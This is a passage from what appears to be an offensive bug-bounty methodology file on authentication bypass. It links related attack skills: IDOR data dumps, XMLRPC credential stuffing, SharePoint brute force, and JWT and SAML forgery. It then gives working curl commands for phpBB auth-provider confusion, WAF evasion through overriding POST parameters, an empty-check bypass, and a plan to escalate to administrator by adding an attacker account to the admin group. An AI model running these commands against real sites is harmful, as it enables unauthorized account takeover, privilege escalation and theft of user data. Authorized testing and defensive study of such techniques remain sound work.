## Related Skills & Chains

- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.

### Phase X — Auth Provider Confusion

Some applications support multiple authentication providers (local DB, OAuth, LDAP, Apache HTTP Basic, SAML). Changing the `auth_provider` parameter to an alternative handler may skip password verification entirely. Confirmed on phpBB CVE-2026-48611 where `auth_provider=apache` bypassed password check.

```bash
# Enumerate auth providers via parameter fuzzing
for provider in local oauth ldap apache saml cas openid sso external; do
  curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/auth/login" \
    -d "username=admin&password=x&auth_provider=$provider" \
    -w "$provider — %{http_code}\n" -o /dev/null
done

# phpBB-specific: Apache provider trusts HTTP Basic header without password
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login_link&auth_provider=apache&login_link_test=1" \
  -H "Authorization: Basic $(echo -n 'admin:x' | base64)" \
  -d "login_username=admin&login_password=x&login=Login"
```

### Phase Y — POST Body Parameter Override

Some frameworks give POST body parameters priority over GET query parameters. An attacker can hide the real `mode=login_link` in the POST body while the WAF/logger sees only `mode=login` in the URL:

```bash
# WAF sees GET: mode=login — attacker sends POST body: mode=login_link
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/ucp.php?mode=login&login_link_test=1" \
  -d "login_username=admin&login_password=x&mode=login_link&auth_provider=apache&login=Login"
```

### Phase Z — Dummy Parameter Injection for Empty-Check Bypass

When code requires certain parameters to be non-empty but doesn't validate their content, inject dummy values:

```bash
# Code checks: if (empty($login_link_data)) → block
# Bypass: add any login_link_* parameter with arbitrary value
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/ucp.php?mode=login_link&login_link_dummy=1"
```

### Escalation: Auth Bypass → Admin via User Group Management

After impersonating a privileged user, check if group/role management is available without re-authentication. On phpBB, the founder user can add other users to the administrator group from the User Control Panel without entering their password:

```bash
# 1. Auth bypass as admin
# 2. Register new attacker account
# 3. As admin, add attacker to ADMINISTRATORS group via UCP (no password needed)
# 4. Login as attacker → full ACP access with known password

## Related Skills

- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
```